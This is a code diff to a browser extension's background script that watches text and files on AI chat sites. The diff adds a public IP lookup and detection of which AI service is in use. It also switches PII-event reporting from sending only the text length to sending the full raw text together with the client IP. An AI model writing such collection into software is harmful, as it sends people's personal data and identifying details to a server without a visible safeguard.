@@ -22,6 +22,31 @@ function normalizePayload(p = {}, sender) {
   return { url, text, files, llm, tab };
 }
 
+// IP 수집
+async function getPublicIP() { 
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return null;
+  }
+}
+
+// 어떤 AI 서비스를 쓰고 있냐?
+function detectAIService(url) {
+  if (!url) return "unknown";
+  const u = url.toLowerCase();
+  if (u.includes("chat.openai.com") || u.includes("chatgpt.com")) return "ChatGPT";
+  if (u.includes("bard.google.com") || u.includes("gemini.google.com")) return "Gemini";
+  if (u.includes("claude.ai")) return "Claude";
+  if (u.includes("copilot.microsoft.com")) return "Copilot";
+  if (u.includes("perplexity.ai")) return "Perplexity";
+  if (u.includes("poe.com")) return "Poe";
+  if (u.includes("huggingface.co")) return "HuggingChat";
+  return "unknown";
+}
+
 // 파일 전송
 async function forwardFileContent(contentPayload) {
   try {
@@ -32,14 +57,17 @@ async function forwardFileContent(contentPayload) {
     }
     const byteArray = new Uint8Array(byteNumbers);
     const blob = new Blob([byteArray], { type: contentPayload.mime });
-
     const formData = new FormData();
+    const ip = await getPublicIP();
+    if (ip) formData.append("client_ip", ip);
     formData.append("Files", blob, contentPayload.name);
 
 // 브라우저/에이전트 메타데이터 추가
-    if (contentPayload.tab) {
-	formData.append("tab", JSON.stringify(contentPayload.tab));
-    }
+    const currentUrl = contentPayload.source_url || contentPayload.origin_url || "";
+    const currentService = detectAIService(currentUrl);
+    const tabData = contentPayload.tab || {};
+    tabData.service = currentService;  // ← 서비스명 추가
+    formData.append("tab", JSON.stringify(tabData));
     if (contentPayload.agent_id) {
 	formData.append("agent_id", contentPayload.agent_id);
     }
@@ -60,12 +88,17 @@ async function forwardToServerFromContent(contentPayload, sender) {
   try {
     const formData = new FormData();
     const raw = contentPayload.raw_text || contentPayload.text || "";
-    const lengthInfo = raw ? `(text length=${raw.length})` : "(no text)";
-    formData.append("text", lengthInfo);
+    const ip = await getPublicIP();
+    if (ip) formData.append("client_ip", ip);
+    formData.append("text", raw || "(no text)");
+    // const lengthInfo = raw ? `(text length=${raw.length})` : "(no text)";
+    // formData.append("text", lengthInfo);
 
-    if (contentPayload.tab) {
-      formData.append("tab", JSON.stringify(contentPayload.tab));
-    }
+    const currentUrl = contentPayload.source_url || contentPayload.origin_url || "";
+    const currentService = detectAIService(currentUrl);
+    const tabData = contentPayload.tab || {};
+    tabData.service = currentService;  // ← 서비스명 추가
+    formData.append("tab", JSON.stringify(tabData));
     if (contentPayload.agent_id) {
       formData.append("agent_id", contentPayload.agent_id);
     }
@@ -111,7 +144,25 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
   }
   if (t === "PII_EVENT") {
     console.log("[bg] PII event received:", url);
-    forwardToServerFromContent(payload || {}, sender);
+    const keepAlive = setInterval(() => {}, 1000);
+    // --- 추가: raw_text가 없을 때 대비 ---
+    if (!payload.raw_text && !payload.text) {
+      console.warn("[bg] empty payload text; skipping send");
+      clearInterval(keepAlive);
+      sendResponse({ ok: false, error: "empty text" });
+      return;
+    }
+    forwardToServerFromContent(payload || {}, sender)
+      .then(() => {
+        console.log("[bg] text forwarded ok");
+        clearInterval(keepAlive);
+        sendResponse({ ok: true });
+      })
+      .catch(e => {
+        console.error("[bg] text forward failed:", e.message || e);
+        clearInterval(keepAlive);
+        sendResponse({ ok: false, error: e.message });
+      });
     return true;
   }
 });
